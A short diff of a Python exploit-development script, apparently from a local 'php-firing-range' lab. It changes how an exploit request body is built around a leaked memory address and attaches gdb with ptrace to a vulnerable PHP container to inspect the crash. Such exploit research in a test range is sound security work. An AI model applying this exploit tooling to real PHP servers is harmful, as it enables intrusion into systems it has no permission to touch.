@@ -32,11 +32,8 @@ for off in range(0, len(seg)-15, 8):
 print(f"d = 0x{d_addr:x}")
 gsid = f"ogc{int(time.time())}"
 o.stage(gsid, b'k|R:3;')
-import smb_oracle6 as o6
-raw = s.read_mem('vuln', d_addr, 0x18)
-chunk = int.from_bytes(raw[0x10:0x18],'little')
-print('chunk:', hex(chunk))
-body = o6.build_body(gsid, chunk)
+import smb_oracle7 as o7
+body = o7.build_body(gsid, d_addr)
 pid_out, _ = s.helper("vuln", "pid")
 pid = pid_out.strip()
 open('/home/user/php-firing-range/scripts/oracle-triage.gdb','w').write(
@@ -47,7 +44,7 @@ open('/home/user/php-firing-range/scripts/oracle-triage.gdb','w').write(
     "x/4i $pc\n"
     "x/8gx %d\n"
     "x/40gx %d\n"
-    "bt 8\ndetach\nquit\n" % (d_addr, chunk))
+    "bt 8\ndetach\nquit\n" % (d_addr, d_addr + 0x3000))
 cmd = ["docker","run","--rm","--cap-add","SYS_PTRACE","--pid=container:"+q.CT["vuln"],
        "-v","/home/user/php-firing-range/scripts:/sc:ro","smb-gdb-helper",
        "gdb","-batch","-p",pid,"-x","/sc/oracle-triage.gdb"]
